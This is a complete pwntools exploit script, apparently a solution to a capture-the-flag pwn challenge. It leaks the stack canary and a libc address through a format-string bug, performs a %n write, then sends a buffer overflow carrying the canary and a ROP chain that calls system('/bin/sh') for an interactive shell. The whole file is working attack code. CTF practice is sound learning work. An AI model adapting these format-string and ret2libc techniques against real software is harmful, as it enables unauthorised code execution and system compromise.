from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')

if sys.argv[1] == 'r':
    s = remote('challenge.pwny.racing', 40005)
    libc = ELF('./libc.so.6')
elif sys.argv[1] == 'd':
    s = gdb.debug('./chall5')
    libc = ELF('./local_libc.so.6')
elif sys.argv[1] == 'l':
    s = process('./chall5')
    libc = ELF('./local_libc.so.6')
# elf = ELF('./chall5')

def leak(N):
    s.recvuntil('pass:')
    buf = f'%{N}$p'
    s.sendline(buf)
    leaked = int(s.recvline().decode().split(' ')[1],16)
    return leaked

def send_pass(buf):
    s.recvuntil('pass:')
    s.sendline(buf)

canary = leak(43)
# pie = leak(3) - 0x73c
libc_base = leak(63) - 245 - 0x1edf0

# elf.address = pie
libc.address = libc_base

that = u16(b'%s')
there = 48
send_pass(f"%{that}c%{there}$n")

rop = ROP(libc)
rop.system(libc.search(b'/bin/sh').__next__())

buf = b'a'*0x80
buf += p32(canary)
buf += b'b'*0xc
buf += rop.chain()
send_pass(buf)

s.interactive()

